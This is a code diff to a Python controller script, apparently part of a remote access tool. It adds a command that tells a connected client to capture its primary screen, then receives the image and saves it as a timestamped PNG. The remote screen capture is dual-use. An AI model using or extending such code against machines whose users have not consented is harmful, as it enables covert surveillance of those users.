@@ -275,6 +275,9 @@ def send_commands():
         elif strChoice == '--p' or strChoice == 'screenshot':
             screenshot()
 
+        elif strChoice == '--p 1' or strChoice == 'pr_screenshoot':
+            screenshot_primary()
+
 
         # TODO: Own Implementation
         # --h, See Commands List Help Menu
@@ -324,7 +327,42 @@ def screenshot():
     except Exception as e:
         print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
 
+def screenshot_primary():
+    send(b'prscreen')
+    # send(str.encode('screen'))
 
+    # Get Screenshot Info and Print it
+    strClientResponse = decode_utf8(recv(intBuff))
+    print(f"\n{strClientResponse}")
+
+    # Used for receive all bytes of screenshot completely
+    intBuffer = ''
+
+    for counter in range(0, len(strClientResponse)):
+
+        # Get out the size of screenshot from strClientResponse and add it to intBuffer
+        if strClientResponse[counter].isdigit():
+            intBuffer += strClientResponse[counter]
+
+    intBuffer = int(intBuffer)
+
+    # Create filename from Date for screenshot
+    strFile = strftime("%Y%m%d%H%M%S" + ".png")
+
+    # Receive Screenshot bytes from the Client
+    screenData = recvall(intBuffer)
+
+    # Try to save screenshot to file
+    try:
+        # Open new file(strFile) and write screenshot to it
+        with open(strFile, 'wb') as pic:
+            pic.write(screenData)
+
+        # Notify User that Screenshot Saved succesfully
+        print(f"[+] Screenshot Saved.\n[+] Total bytes received: {str(path.getsize(strFile))} bytes.")
+
+    except Exception as e:
+        print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
 
 
 
